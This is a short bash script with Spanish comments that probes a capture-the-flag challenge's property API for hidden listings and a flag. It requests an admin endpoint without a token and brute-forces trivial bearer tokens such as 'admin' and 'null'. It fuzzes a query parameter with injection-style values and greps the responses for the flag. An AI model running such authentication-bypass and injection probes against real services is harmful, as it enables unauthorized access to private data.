#!/usr/bin/env bash
# Uso: ./probe.sh https://HOST-DEL-RETO
# Sondea la API de FluidRealty buscando listados privados / flag.
set -u
BASE="${1:?pasa la URL base del reto, ej: https://xxxx.chal.ctf.ae}"
H=(-sk --max-time 20 -H "X-App-Version: 3.7.2" -H "X-Platform: android")

echo "=== [1] GET /api/properties (JSON crudo — buscar propiedades privadas/flag) ==="
curl "${H[@]}" "$BASE/api/properties"; echo

echo "=== [2] GET /api/properties/admin (sin token) ==="
curl "${H[@]}" -i "$BASE/api/properties/admin" | head -c 1500; echo

echo "=== [3] admin con tokens triviales ==="
for t in admin null undefined test 1 true admin:admin; do
  code=$(curl "${H[@]}" -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $t" "$BASE/api/properties/admin")
  echo "  Bearer '$t' -> HTTP $code"
done

echo "=== [4] filtros por city ==="
for c in private admin all hidden %25 "'" internal; do
  echo "  city=$c:"; curl "${H[@]}" "$BASE/api/properties?city=$c" | head -c 400; echo
done

echo "=== [5] grep flag en todo ==="
{ curl "${H[@]}" "$BASE/api/properties"; curl "${H[@]}" "$BASE/api/properties/admin"; } | grep -oE 'flag\{[^}]*\}' || echo "  (sin flag directa; revisar arriba)"
